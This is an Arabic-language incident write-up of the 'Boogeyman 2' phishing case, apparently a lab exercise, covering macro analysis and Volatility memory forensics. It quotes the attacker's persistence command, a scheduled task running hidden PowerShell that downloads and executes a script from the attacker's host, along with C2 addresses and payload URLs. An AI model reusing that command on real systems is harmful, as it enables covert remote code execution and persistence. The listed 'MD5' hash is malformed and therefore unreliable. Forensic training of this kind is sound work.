# 🕵️‍♂️ Investigation Report: Case Boogeyman 2 (Phishing & Memory Analysis)

## 📋 Scenario Overview
تحليل هجمة **Phishing** متطورة استهدفت موظفة في قسم الموارد البشرية (Maxine). الهجمة اعتمدت على **Malicious Macro** داخل ملف Word، وتطورت إلى **C2 Connection** و **Persistence**. تم التحقيق باستخدام أدوات الـ **Digital Forensics** لتحليل ملفات الـ Email والـ **Memory Dump**.

---

## 🛠️ Technical Findings & Evidence (Artifacts)

### 1. Phishing Analysis (Email & Attachment)
* **Attacker Email:** تم إرسال البريد الاحتيالي من العنوان: `westaylor23@outlook.com`.
* **Victim Email:** الموظفة المستهدفة هي `maxine.beck@quicklogisticsorg.onmicrosoft.com`.
* **Malicious Attachment:** الملف المرفق كان عبارة عن سيرة ذاتية خبيثة باسم: `Resume_WesleyTaylor.doc`.
* **File Integrity:** الـ **MD5 Hash** الخاص بالمرفق الخبيث هو: `52c4384a0b9e248b9580416d3b47d85538d9971`.

### 2. Macro Analysis (Olevba)
* **Stage 2 Delivery:** بتحليل الـ **VBA Macros** داخل المستند، تم العثور على **URL** مستخدم لتحميل الـ Stage 2 Payload وهو: `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png`.
* **Payload Execution:** الملف المحمل تم تنفيذه بواسطة **Process** تسمى: `wscript.exe`.
* **File Path:** المسار الكامل للـ Stage 2 Payload كان: `C:\ProgramData\update.js`.

### 3. Memory Forensics (Volatility 3)
* **Process Analysis:** تم تحديد الـ **PID** الخاص بالبروسيس التي نفذت الـ Stage 2 وهو `4260` والـ **Parent PID** لها هو `1124`.
* **Malicious Binary URL:** استخدم المهاجم الرابط التالي لتحميل الـ Binary الخبيث: `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe`.
* **C2 Connection:** قام الـ **Malicious Binary** بفتح اتصال **C2** مع العنوان: `128.199.95.189:8080`.
* **C2 Process:** البروسيس المسؤولة عن اتصال الـ C2 هي `updater.exe` ومسارها: `C:\Windows\Tasks\updater.exe` بـ **PID**: `6216`.

### 4. Persistence Mechanism
* **Scheduled Task:** فور إنشاء اتصال الـ C2، قام المهاجم بإنشاء **Scheduled Task** باسم `Updater` لضمان البقاء (Persistence) عبر الأمر التالي:
  `schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX (New-Object Net.WebClient).DownloadString(''http://files.boogeymanisback.lol/update.ps1'')\"'`

---
💡 *تم استخراج هذه الأدلة الرقمية عبر دمج تحليل الـ Email، أدوات الـ Oletools، وتحليل الـ Memory Dump باستخدام Volatility 3.*
